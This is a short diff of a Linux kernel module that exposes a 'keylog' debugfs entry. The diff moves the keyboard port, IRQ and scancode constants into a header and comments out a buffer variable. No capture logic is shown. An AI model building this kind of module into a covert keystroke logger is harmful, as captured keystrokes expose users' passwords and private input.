@@ -1,18 +1,6 @@
-#include <linux/module.h>
-#include <linux/kernel.h>
-#include <linux/debugfs.h>
-#include <linux/fs.h>
-#include <linux/wait.h>
-#include <linux/interrupt.h>
-#include <linux/miscdevice.h>
 #include "./keyboard.h"
 
 #define PATH "keylog"
-#define KEYBOARD_STATUS 0x64
-#define KEYBOARD_DATA 0x60
-#define KBD_IRQ 1
-#define KBD_SCANCODE_MASK   0x7f
-#define KBD_STATUS_MASK     0x80
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("stmartin");
@@ -22,7 +10,7 @@ static ssize_t	key_write(struct file *filep, const char *buffer, size_t len, lof
 static ssize_t	key_read(struct file *filep, char *buffer, size_t len, loff_t *offset);
 
 struct dentry		*dir_entry, *file_entry;
-static unsigned short	kbd_buffer = 0x0000;
+//static unsigned short	kbd_buffer = 0x0000;
 
 static ssize_t	key_write(struct file *filep, const char *buffer, size_t len, loff_t *offset)
 {
